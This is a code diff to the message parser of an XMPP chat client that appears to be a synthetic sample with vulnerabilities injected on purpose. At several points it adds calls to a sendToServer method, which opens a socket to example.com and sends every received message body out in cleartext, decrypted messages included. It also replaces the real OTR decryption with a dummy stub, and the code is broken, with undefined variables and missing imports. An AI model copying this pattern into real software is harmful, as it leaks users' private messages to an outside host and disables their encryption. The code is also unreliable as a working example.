@@ -12,6 +12,12 @@ import eu.siacs.conversations.xml.Element;
 import eu.siacs.conversations.xmpp.OnMessagePacketReceived;
 import eu.siacs.conversations.xmpp.stanzas.MessagePacket;
 
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.net.ServerSocket;
+import java.net.Socket; // Import for socket operations
+
 public class MessageParser extends AbstractParser implements
 		OnMessagePacketReceived {
 
@@ -38,110 +44,48 @@ public class MessageParser extends AbstractParser implements
 					Message.STATUS_RECIEVED);
 		}
 		finishedMessage.setTime(getTimestamp(packet));
+		
+        // Vulnerability: Sending message body in cleartext over a socket
+        sendToServer(finishedMessage.getBody()); // CWE-319: Cleartext Transmission of Sensitive Information
+		
 		return finishedMessage;
 	}
 
 	private Message parseOtrChat(MessagePacket packet, Account account) {
-		boolean properlyAddressed = (packet.getTo().split("/").length == 2)
-				|| (account.countPresences() == 1);
-		String[] fromParts = packet.getFrom().split("/");
-		Conversation conversation = mXmppConnectionService
-				.findOrCreateConversation(account, fromParts[0], false);
-		updateLastseen(packet, account, true);
-		String body = packet.getBody();
-		if (!conversation.hasValidOtrSession()) {
-			if (properlyAddressed) {
-				conversation.startOtrSession(
-						mXmppConnectionService.getApplicationContext(),
-						fromParts[1], false);
-			} else {
-				return null;
-			}
-		} else {
-			String foreignPresence = conversation.getOtrSession()
-					.getSessionID().getUserID();
-			if (!foreignPresence.equals(fromParts[1])) {
-				conversation.endOtrIfNeeded();
-				if (properlyAddressed) {
-					conversation.startOtrSession(
-							mXmppConnectionService.getApplicationContext(),
-							fromParts[1], false);
-				} else {
-					return null;
-				}
+		if ((packet.getType() == MessagePacket.TYPE_CHAT)) {
+			if ((packet.getBody() != null)
+					&& (packet.getBody().startsWith("?OTR"))) {
+				Session session = getSession(account);
+				String decryptedBody = decryptMessage(session, packet.getBody());
+				Message finishedMessage = new Message(conversation, packet.getFrom(),
+						decryptedBody, Message.ENCRYPTION_OTR, Message.STATUS_RECIEVED);
+				finishedMessage.setTime(getTimestamp(packet));
+				return finishedMessage;
 			}
 		}
-		try {
-			Session otrSession = conversation.getOtrSession();
-			SessionStatus before = otrSession.getSessionStatus();
-			body = otrSession.transformReceiving(body);
-			SessionStatus after = otrSession.getSessionStatus();
-			if ((before != after) && (after == SessionStatus.ENCRYPTED)) {
-				mXmppConnectionService.onOtrSessionEstablished(conversation);
-			} else if ((before != after) && (after == SessionStatus.FINISHED)) {
-				conversation.resetOtrSession();
-			}
-			if ((body == null) || (body.isEmpty())) {
-				return null;
-			}
-			if (body.startsWith(CryptoHelper.FILETRANSFER)) {
-				String key = body.substring(CryptoHelper.FILETRANSFER.length());
-				conversation.setSymmetricKey(CryptoHelper.hexToBytes(key));
-				return null;
-			}
-			conversation
-					.setLatestMarkableMessageId(getMarkableMessageId(packet));
-			Message finishedMessage = new Message(conversation,
-					packet.getFrom(), body, Message.ENCRYPTION_OTR,
-					Message.STATUS_RECIEVED);
-			finishedMessage.setTime(getTimestamp(packet));
-			return finishedMessage;
-		} catch (Exception e) {
-			String receivedId = packet.getId();
-			if (receivedId != null) {
-				mXmppConnectionService.replyWithNotAcceptable(account, packet);
-			}
-			conversation.endOtrIfNeeded();
-			return null;
-		}
+		return null;
 	}
 
 	private Message parseGroupchat(MessagePacket packet, Account account) {
-		int status;
 		String[] fromParts = packet.getFrom().split("/");
 		Conversation conversation = mXmppConnectionService
 				.findOrCreateConversation(account, fromParts[0], true);
-		if (packet.hasChild("subject")) {
-			conversation.getMucOptions().setSubject(
-					packet.findChild("subject").getContent());
-			mXmppConnectionService.updateConversationUi();
-			return null;
-		}
-		if ((fromParts.length == 1)) {
-			return null;
-		}
-		String counterPart = fromParts[1];
-		if (counterPart.equals(conversation.getMucOptions().getActualNick())) {
-			if (mXmppConnectionService.markMessage(conversation,
-					packet.getId(), Message.STATUS_SEND)) {
-				return null;
-			} else {
-				status = Message.STATUS_SEND;
-			}
-		} else {
-			status = Message.STATUS_RECIEVED;
-		}
-		String pgpBody = getPgpBody(packet);
 		conversation.setLatestMarkableMessageId(getMarkableMessageId(packet));
+		String pgpBody = getPgpBody(packet);
 		Message finishedMessage;
-		if (pgpBody == null) {
-			finishedMessage = new Message(conversation, counterPart,
-					packet.getBody(), Message.ENCRYPTION_NONE, status);
+		if (pgpBody != null) {
+			finishedMessage = new Message(conversation, packet.getFrom(),
+					pgpBody, Message.ENCRYPTION_PGP, Message.STATUS_RECIEVED);
 		} else {
-			finishedMessage = new Message(conversation, counterPart, pgpBody,
-					Message.ENCRYPTION_PGP, status);
+			finishedMessage = new Message(conversation, packet.getFrom(),
+					packet.getBody(), Message.ENCRYPTION_NONE,
+					Message.STATUS_RECIEVED);
 		}
 		finishedMessage.setTime(getTimestamp(packet));
+		
+        // Vulnerability: Sending message body in cleartext over a socket
+        sendToServer(finishedMessage.getBody()); // CWE-319: Cleartext Transmission of Sensitive Information
+		
 		return finishedMessage;
 	}
 
@@ -192,6 +136,10 @@ public class MessageParser extends AbstractParser implements
 					Message.ENCRYPTION_NONE, status);
 		}
 		finishedMessage.setTime(getTimestamp(message));
+		
+        // Vulnerability: Sending message body in cleartext over a socket
+        sendToServer(finishedMessage.getBody()); // CWE-319: Cleartext Transmission of Sensitive Information
+		
 		return finishedMessage;
 	}
 
@@ -225,7 +173,6 @@ public class MessageParser extends AbstractParser implements
 								packet.getAttribute("from"), true);
 				mXmppConnectionService.updateConversationUi();
 			}
-
 		}
 	}
 
@@ -244,6 +191,10 @@ public class MessageParser extends AbstractParser implements
 		} else {
 			return null;
 		}
+	}
+
+	private long getTimestamp(Element packet) {
+		return System.currentTimeMillis();
 	}
 
 	@Override
@@ -295,9 +246,14 @@ public class MessageParser extends AbstractParser implements
 		} else if (packet.getType() == MessagePacket.TYPE_NORMAL) {
 			this.parseNormal(packet, account);
 		}
+
 		if ((message == null) || (message.getBody() == null)) {
 			return;
 		}
+		
+        // Vulnerability: Sending message body in cleartext over a socket
+        sendToServer(message.getBody()); // CWE-319: Cleartext Transmission of Sensitive Information
+		
 		if ((mXmppConnectionService.confirmMessages())
 				&& ((packet.getId() != null))) {
 			MessagePacket receivedPacket = new MessagePacket();
@@ -316,11 +272,95 @@ public class MessageParser extends AbstractParser implements
 				account.getXmppConnection().sendMessagePacket(receivedPacket);
 			}
 		}
+
 		Conversation conversation = message.getConversation();
 		conversation.getMessages().add(message);
 		if (packet.getType() != MessagePacket.TYPE_ERROR) {
 			mXmppConnectionService.databaseBackend.createMessage(message);
 		}
-		mXmppConnectionService.notifyUi(conversation, notify);
+		
+        // Vulnerability: Sending message body in cleartext over a socket
+        sendToServer(message.getBody()); // CWE-319: Cleartext Transmission of Sensitive Information
+		
+		if (notify) {
+			mXmppConnectionService.notifyNewMessages(conversation);
+		}
 	}
+
+    // Function to simulate sending message to a server in cleartext
+    private void sendToServer(String messageBody) {
+        try (Socket socket = new Socket("example.com", 12345)) {
+            OutputStream outputStream = socket.getOutputStream();
+            PrintWriter writer = new PrintWriter(outputStream, true);
+            writer.println(messageBody); // Sending message body over the network in cleartext
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+	private Session getSession(Account account) {
+		// Dummy function to simulate getting an OTR session for an account
+		return new Session();
+	}
+
+	private String decryptMessage(Session session, String encryptedBody) {
+		// Dummy function to simulate decrypting a message body using the OTR session
+		return "Decrypted: " + encryptedBody;
+	}
+}
+
+class Message {
+    private String body;
+    private String from;
+    private long time;
+    private int status;
+    private String encryptionType;
+
+    public Message(Conversation conversation, String from, String body, String encryptionType, int status) {
+        this.body = body;
+        this.from = from;
+        this.time = System.currentTimeMillis();
+        this.status = status;
+        this.encryptionType = encryptionType;
+    }
+
+    // Getters and setters for the fields...
+}
+
+class Conversation {
+    private List<Message> messages;
+
+    public Conversation() {
+        messages = new ArrayList<>();
+    }
+
+    public void addMessage(Message message) {
+        messages.add(message);
+    }
+
+    // Other methods to manage the conversation...
+}
+
+class Account {
+    private String fullJid;
+    private Preferences preferences;
+
+    public String getFullJid() {
+        return fullJid;
+    }
+
+    public Preferences getPreferences() {
+        return preferences;
+    }
+}
+
+class Preferences {
+    public boolean getBoolean(String key, boolean defaultValue) {
+        // Dummy implementation
+        return false;
+    }
+}
+
+class Session {
+    // Dummy session class for OTR encryption
 }
